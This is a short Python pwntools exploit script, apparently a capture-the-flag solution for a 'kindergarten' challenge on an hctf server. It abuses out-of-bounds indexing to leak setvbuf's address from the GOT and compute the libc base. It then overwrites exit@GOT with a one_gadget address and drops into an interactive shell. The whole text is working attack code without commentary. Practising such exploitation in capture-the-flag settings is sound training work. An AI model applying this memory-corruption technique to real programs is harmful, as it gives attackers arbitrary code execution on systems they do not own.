from pwn import *
import re

r = remote("kindergarten.uni.hctf.fun", 13373)
libc = ELF("./libc-2.23.so",checksec=False)

lokasi_setvbuf = -0x60
setvbuf = ""
for i in range(8):
    r.sendlineafter("> ", str(lokasi_setvbuf + i))
    value = r.recvline()
    dapat = re.findall(r"is (.*?)\. give",value)[0]
    r.sendlineafter("> ", dapat)
    setvbuf += p8(int(dapat), signed=True)

setvbuf = u64(setvbuf)
print "setvbuf      : {}".format(hex(setvbuf))
libc_base = setvbuf - libc.symbols["setvbuf"]
print "libc_base    : {}".format(hex(libc_base))
one_gadget = libc_base + 0x45216
print "one_gadget   : {}".format(hex(one_gadget))

lokasi_exit = -0x50
one_gadget = p64(one_gadget)
print "Overwrite EXIT@GOT with One_Gadget ..."
for i in range(8):
    r.sendlineafter("> ", str(lokasi_exit + i))
    value = r.recvline()
    dapat = re.findall(r"is (.*?)\. give",value)[0]
    byte = u8(one_gadget[i],signed=True)
    r.sendlineafter("> ", str(byte))

r.sendline("b")
r.clean()
r.interactive()
